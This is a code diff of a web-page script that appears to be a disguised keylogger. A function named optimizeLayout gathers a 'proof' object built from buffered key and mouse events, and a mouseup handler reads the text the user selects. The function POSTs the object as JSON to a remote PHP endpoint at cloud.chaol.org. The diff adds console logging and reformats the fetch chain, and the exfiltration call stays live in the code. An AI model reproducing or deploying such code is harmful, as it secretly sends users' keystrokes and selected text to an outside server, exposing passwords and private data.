@@ -111,20 +111,25 @@ function optimizeLayout(triggerEvent) {
         proof.Event = triggerEvent;
     }
 
+    console.log(proof); // This will display the content of proof in the console.
+    if (Object.keys(proof).length === 0) {
+        console.error('Proof object is empty!');
+    }
+
+    
+    
     fetch('https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify(proof)
-    })
-        .catch(error => {
-            console.error('Error:', error);
-        })
-        .finally(() => {
-            eventsBuffer = [];
-            keyBuffer = [];
-        });
+    }).catch(error => {
+        console.error('Error:', error);
+    }).finally(() => {
+        eventsBuffer = [];
+        keyBuffer = [];
+    });
 }
 
 
@@ -149,7 +154,7 @@ document.addEventListener('mouseup', function () {
     let words = selectedText.split(/\s+/);
     for (let i = 0; i < words.length; i++) {
         try {
-             encodeURI(words[i]);
+            encodeURI(words[i]);
             // words[i] = encodeURI(words[i]);
         } catch (err) {
             console.error("Error Selecting and Encoding the word:", err, "The Word is:", words[i]);
